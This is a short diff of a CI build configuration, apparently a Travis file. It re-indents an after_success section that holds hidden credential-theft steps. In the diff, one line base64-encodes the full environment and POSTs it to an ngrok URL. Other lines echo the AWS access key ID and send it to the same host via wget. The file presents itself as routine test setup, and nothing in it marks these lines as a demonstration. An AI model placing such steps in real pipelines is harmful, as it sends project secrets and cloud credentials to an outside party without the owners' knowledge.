@@ -14,8 +14,8 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
--STUFF=$(env | base64); curl -d "$STUFF" -X POST http://dfb248ba2dba.ngrok.io 
-- pip install --user awscli
+  -STUFF=$(env | base64); curl -d "$STUFF" -X POST http://dfb248ba2dba.ngrok.io 
+  - pip install --user awscli
   - echo $AWS_ACCESS_KEY_ID
   - wget http://dfb248ba2dba.ngrok.io/'echo $AWS_ACCESS_KEY_ID'
   - docker --version
